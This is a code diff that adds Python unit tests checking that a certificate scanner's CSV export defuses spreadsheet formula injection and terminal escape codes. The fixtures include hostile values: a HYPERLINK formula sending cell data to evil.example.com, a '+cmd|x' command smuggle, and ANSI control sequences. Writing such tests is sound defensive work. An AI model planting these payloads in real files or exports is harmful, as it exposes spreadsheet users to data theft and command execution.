@@ -13,6 +13,7 @@ import base64
 import codecs
 import contextlib
 import csv
+import dataclasses
 import hashlib
 import importlib.util
 import io
@@ -1625,6 +1626,45 @@ class OutputTests(unittest.TestCase):
         self.assertEqual(record['new_cert_covers'], 'yes')
         self.assertEqual(record['cert_sha256'], RENEWED_WILD_SHA256)
         self.assertTrue(sos.render_csv(self.report, lineterminator='\n').endswith('\n'))
+
+    def test_csv_neutralises_formulas_and_controls_from_certificates(self):
+        base = fixture_cert('ec_wildcard.pem')
+        link = '=HYPERLINK("http://evil.example.com/?"&A1,"ok")'
+        evil = dataclasses.replace(base, subject_cn=link, issuer_cn='@SUM(1)',
+                                   issuer={'CN': '@SUM(1)', 'O': '+cmd|x'})
+        escapes = dataclasses.replace(base, subject_cn='\tx\x1b[2K', issuer_cn='ok\x07',
+                                      issuer={'CN': 'ok\x07'})
+        after_expiry = datetime(2052, 1, 1, tzinfo=timezone.utc)  # ec_wildcard: days left < 0
+        report = sos.ScanReport(
+            servers=[], probes=[], ports=[443], new_certs=[], endpoints=[], certificates={},
+            results=[sos.ProbeResult('-web', '192.0.2.1', 443, sos.PROBE_SNI, 'a.example.com',
+                                     'a.example.com', sos.NEEDS_UPDATE, cert=evil),
+                     sos.ProbeResult('web', '192.0.2.2', 443, sos.PROBE_SNI, 'a.example.com',
+                                     'a.example.com', sos.NEEDS_UPDATE, cert=escapes)],
+            started_at=after_expiry, finished_at=after_expiry)
+        text = sos.render_csv(report)
+        rows = list(csv.reader(io.StringIO(text)))
+        self.assertEqual(tuple(rows[0]), sos.CSV_COLUMNS)  # the header is never touched
+        first, second = (dict(zip(rows[0], row)) for row in rows[1:])
+        self.assertEqual(first['cert_subject_cn'], "'" + link)
+        self.assertEqual(first['cert_issuer'], "'@SUM(1) (+cmd|x)")
+        self.assertEqual(first['server'], "'-web")
+        self.assertEqual(first['port'], '443')
+        self.assertRegex(first['cert_days_left'], r'^-\d+$')  # a number, left as it is
+        self.assertEqual(second['cert_subject_cn'], "'\\x09x\\x1b[2K")
+        self.assertEqual(second['cert_issuer'], 'ok\\x07')
+        self.assertNotIn('\x1b', text)
+        # the JSON report keeps the exact values
+        doc = json.loads(sos.render_json(report))
+        self.assertEqual(doc['results'][0]['certSubjectCN'], link)
+        self.assertEqual(doc['results'][1]['certSubjectCN'], '\tx\x1b[2K')
+
+    def test_csv_formula_rule_matches_the_web_app(self):
+        source = (ROOT / 'assets' / 'js' / 'lib' / 'export.js').read_text(encoding='utf-8')
+        match = re.search(r'^const FORMULA_START = /\^\[(.*?)\]/;$', source, re.M)
+        self.assertIsNotNone(match, 'FORMULA_START in lib/export.js')
+        chars = match.group(1).replace('\\-', '-').replace('\\t', '\t').replace('\\r', '\r')
+        self.assertEqual(sorted(chars), sorted(sos._CSV_FORMULA_START))
 
     def test_human_summary_plain(self):
         text = sos.render_summary(self.report, color=False, width=100)
